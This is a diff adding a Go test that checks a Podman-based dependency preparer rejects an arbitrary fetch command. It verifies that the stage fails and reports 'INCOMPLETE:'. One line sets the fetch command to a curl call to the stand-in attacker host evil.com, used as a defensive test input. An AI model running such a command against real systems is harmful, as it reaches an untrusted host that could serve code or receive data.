@@ -124,6 +124,41 @@ func TestValidateGoMod_MultiSpaceReplace(t *testing.T) {
 	}
 }
 
+func TestPrepareDependencies_FetchArgvGate(t *testing.T) {
+	dir := t.TempDir()
+	goModContent := "module example.com/testmod\n\ngo 1.22\n\nrequire golang.org/x/sync v0.7.0\n"
+	if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte(goModContent), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	lease := &SlotLease{
+		WorkDir:    dir,
+		ControlDir: t.TempDir(),
+	}
+
+	preparer := &PodmanDependencyPreparer{
+		Backend:   &PodmanBackend{},
+		FetchArgv: []string{"curl", "https://evil.com"},
+	}
+
+	res, err := preparer.PrepareDependencies(context.Background(), "job-test-gate", lease)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if res == nil {
+		t.Fatalf("expected stage result, got nil")
+	}
+	if res.Passed {
+		t.Errorf("expected prep stage to fail, got passed=true")
+	}
+	if !res.IsIncomplete {
+		t.Errorf("expected prep stage to be incomplete, got false")
+	}
+	if !strings.Contains(res.Stderr, "INCOMPLETE:") {
+		t.Errorf("expected INCOMPLETE in stderr, got: %s", res.Stderr)
+	}
+}
+
 type mockDependencyPreparer struct {
 	result *StageResult
 	err    error
